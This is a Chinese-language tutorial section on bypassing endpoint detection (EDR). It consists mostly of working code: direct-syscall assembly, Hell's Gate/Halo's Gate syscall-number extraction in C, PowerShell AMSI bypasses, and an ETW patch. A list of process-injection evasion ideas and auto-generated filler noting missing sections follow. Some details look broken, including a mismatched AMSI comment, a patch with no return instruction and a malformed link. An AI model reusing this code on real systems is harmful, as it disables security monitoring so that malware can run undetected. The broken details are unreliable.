# EDR 绕过技术

### 7.1 直接系统调用（Direct Syscalls）

绕过 EDR 的用户态 API Hook（如 ntdll.dll 中的 Nt* 函数 Hook），直接执行系统调用指令。

```c
// 直接系统调用示例 - NtAllocateVirtualMemory
// 从 ntdll.dll 中提取系统调用号，直接 syscall

; x64 汇编 - 直接系统调用
; 替代调用 NtAllocateVirtualMemory
; 避免经过 ntdll.dll 的 Hook 点

my_NtAllocateVirtualMemory proc
    ; 系统调用号需要动态获取（不同 Windows 版本不同）
    mov r10, rcx            ; 将第一个参数移到 r10
    mov eax, 18h            ; NtAllocateVirtualMemory 系统调用号
    syscall                 ; 直接系统调用，绕过 ntdll Hook
    ret
my_NtAllocateVirtualMemory endp

; 完整的 Syswhispers 风格实现
; 使用 Hell's Gate / Halo's Gate 技术动态获取 SSN
; https://github.com/jthuriez/Hello's Gate
```

```c
// Hell's Gate - 动态获取 SSN
// 遍历 ntdll 导出表找到 Nt* 函数
// 读取函数开头的 syscall 指令获取 SSN

DWORD GetSSN(LPCSTR functionName) {
    HMODULE ntdll = GetModuleHandleA("ntdll.dll");
    DWORD ssn = 0;
    
    // 获取函数地址
    FARPROC func = GetProcAddress(ntdll, functionName);
    
    // 读取函数开头字节，提取 syscall number
    // Nt* 函数开头通常是:
    // mov r10, rcx       (4C 8B D1)
    // mov eax, <SSN>     (B8 XX XX 00 00)
    BYTE* ptr = (BYTE*)func;
    if (ptr[0] == 0x4C && ptr[1] == 0x8B && ptr[2] == 0xD1 &&
        ptr[3] == 0xB8) {
        ssn = *(DWORD*)(ptr + 4);
    } else {
        // 如果被 Hook，函数开头不是标准模式
        // 使用 Halo's Gate - 遍历相邻函数推测 SSN
        for (int i = 1; i <= 500; i++) {
            ptr = (BYTE*)func + i * 0x20; // 相邻函数间隔
            if (ptr[0] == 0x4C && ptr[3] == 0xB8) {
                ssn = *(DWORD*)(ptr + 4) + i;
                break;
            }
            ptr = (BYTE*)func - i * 0x20;
            if (ptr[0] == 0x4C && ptr[3] == 0xB8) {
                ssn = *(DWORD*)(ptr + 4) - i;
                break;
            }
        }
    }
    return ssn;
}
```

### 7.2 AMSI 绕过

**AMSI（Anti-Malware Scan Interface）** 是 Windows 10+ 提供的恶意内容扫描接口，EDR 通过 AMSI 扫描 PowerShell 脚本等内容。

```powershell
# AMSI 绕过 - 修改内存中 AmsiScanBuffer 函数

# 方式1: 内存 Patch（将 AmsiScanBuffer 返回成功）
# AmsiScanBuffer 开头 patch 为直接返回 S_OK
$a = [Ref].Assembly.GetType('System.Management.Automation.AmsiUtils')
$b = $a.GetField('amsiInitFailed','NonPublic,Static')
$b.SetValue($null,$true)

# 方式2: 直接 Patch Amsi.dll
# 将 AmsiScanBuffer 的第一条指令替换为 ret
$signature = @"
[DllImport("kernel32")]
public static extern IntPtr GetProcAddress(IntPtr hModule, string procName);
[DllImport("kernel32")]
public static extern IntPtr LoadLibrary(string name);
[DllImport("kernel32")]
public static extern bool VirtualProtect(IntPtr addr, int size, 
    int newProtect, out int oldProtect);
"@
$type = Add-Type -Member $signature -Name Win32 -Namespace PS -PassThru
$handle = $type::LoadLibrary("amsi.dll")
$addr = $type::GetProcAddress($handle, "AmsiScanBuffer")
$old = 0
$type::VirtualProtect($addr, 5, 0x40, [ref]$old) | Out-Null
$patch = [Byte[]](0xB8,0x57,0x00,0x07,0x80)  # mov eax, 0x80070057
[Runtime.InteropServices.Marshal]::Copy($patch, 0, $addr, 5)
```

### 7.3 ETW 绕过

```c
// ETW 绕过 - Patch EtwNotificationWrite 或 EtwEventWrite
// 使 EDR 注册的 ETW 提供者无法接收事件

#include <windows.h>

void PatchETW() {
    HMODULE ntdll = LoadLibraryA("ntdll.dll");
    FARPROC etwEventWrite = GetProcAddress(ntdll, "EtwEventWrite");
    
    // 将 EtwEventWrite 的开头 patch 为 ret
    // 这样所有 ETW 事件写入请求都被跳过
    DWORD oldProtect;
    VirtualProtect(etwEventWrite, 1, PAGE_EXECUTE_READWRITE, &oldProtect);
    
    // 0xC3 = ret 指令
    *(BYTE*)etwEventWrite = 0xC3;
    
    VirtualProtect(etwEventWrite, 1, oldProtect, &oldProtect);
}

// 更隐蔽的方式: 取消 ETW Provider 注册
// EDR Agent 启动的 ETW Trace Session 被终止
// EtwStopTrace(SessionHandle)
```

### 7.4 进程注入检测绕过

```
EDR 检测进程注入的方式:
├── 监控 OpenProcess 跨进程句柄获取
├── 监控 VirtualAllocEx + WriteProcessMemory 组合
├── 监控 CreateRemoteThread / NtCreateThreadEx
├── 监控 QueueUserAPC
└── 监控 SetThreadContext

绕过思路:
├── 使用间接调用（不直接调用 API）
├── 使用合法系统进程作为注入目标
├── 使用 NtMapViewOfSection（共享内存映射）
├── 使用 Process Ghosting / Herpaderping
├── 使用 Module Stomping（覆盖合法 DLL）
└── 在 EDR Agent 加载前执行（Boot 启动）
```

---

---

## 📋 内容审核与补充建议

> 针对「EDR 绕过技术」部分的内容审核结果：

### 🔧 工具推荐
- ⚠️ 缺少tools相关内容

### 📚 知识点补充
- ⚠️ 缺少knowledge相关内容

### 🎯 实战练习
- ⚠️ 缺少practice相关内容

### 🛡️ 防御方案
- ⚠️ 缺少defense相关内容

### ⚔️ 攻击技术
- ⚠️ 缺少attack相关内容

### 📖 参考资料
- ⚠️ 缺少参考资料/延伸阅读

---

## 📌 拓展学习资源

### 推荐学习路径
- 理论基础 → 工具实践 → 实战演练 → 深度研究
- 建议搭建本地实验环境进行动手练习

### 相关工具与资源
- 在线实验平台：Hack The Box、TryHackMe、VulnHub
- 技术文档：官方文档、RFC、OWASP 指南
- 社区资源：GitHub、安全论坛、技术博客
